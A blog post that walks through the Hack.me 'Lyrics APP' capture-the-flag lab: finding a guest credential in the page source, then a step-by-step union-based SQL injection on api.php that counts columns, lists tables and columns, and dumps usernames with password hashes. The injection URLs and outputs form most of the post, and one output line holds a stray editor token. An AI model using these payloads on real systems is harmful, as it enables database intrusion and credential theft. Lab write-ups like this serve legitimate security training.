---
layout: post
title: Hack.me - Lyrics APP
categories: [ctf]
tags: [ctf, wargames, web]
fullview: false
comments: true
---

[Hack.me](https://hack.me) is one of those great resources every wannabe hacker should know. Like HackTheBox and Root-me, this is a valuable place to practice. Let me show it with an easy writeup.
Check here the [Lyrics APP](https://hack.me/103027/lyrics-app.html) challenge.

# First steps

Whenever facing a target for the first time, do not skip the basics. Checking the source code is always somehting in my checklist, although any decent site should probably not contain any specially valuable information. In this case however we find `guest/guest` as a valid credential. Yep, really simple, yet I heard many people wasted hours banging their heads against the login form.

# Look under the carpet

This chall is not difficult, but it can take a long timne if you are not looking in the right place. It might deceive you and make you think the vulnerability lies in the login form. Well guess what, it does not.

    “Talk is cheap. Show me the code.” (Linus)

Again, check the code. When you do it you will find a screaming `XMLHttpRequest` to `api.php?id=xxx` which looks damn suspicious. Browsing that page with `id=1` we see a JSON result corresponding to the first lyric in the page. Now it is all about the bass.

# The real deal

Most of the techniques used here can be found in [this aewsome page](breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html). First thing to notice is this is an *error-based SQLi*. Whenever our query results in an error, an unexpected result should show up (like a blank page).

## Finding the number of columns

~~~
api.php?id=2 order by 1-- 
api.php?id=2 order by 2-- 
api.php?id=2 order by 3-- 
api.php?id=2 order by 4-- 
api.php?id=2 order by 5-- (blank page)
~~~

Great, 4 columns. 

## Finding the table name

    http://s76480-103027-bfl.croto.hack.me/api.php?id=-1%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()
    {"id":"1","artist":"2","title":"3","lyric":"lyrics,users"} 

## Finding the column name

    http://s76480-103027-bfl.croto.hack.me/api.php?id=-1%20union%20select%201,2,3,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()--
    {"id":"1","artist":"2","title":"3","lyric":"id,artist,title,lyric,id,username,password"} 

## Dumping the data

    http://s76480-103027-bfl.croto.hack.me/api.php?id=-1%20union%20select%201,2,3,group_concat(username,%200x3a,%20password)%20from%20users-- 
    {"id":"1","artist":"2","title":"3","lyric":"jackson.michael:7c6a180b36896a0a8c02787eeafb0e4c,lennon.john:6cb75f652a9b52798eb6cf2201057c73,mercury.freddie:819b0643d6b89dc9b579fdfc9094f28e<Plug>PeepOpenresley.elvis:34cc93ece0ba9e3f6f235d4af979b16c,brown.james:db0edd04aaac4506f7edab03ac855d56,guest:084e0343a0486ff05530df6c705c8bb4"} 

![That is All Folks](https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Thats_all_folks.svg/2000px-Thats_all_folks.svg.png)
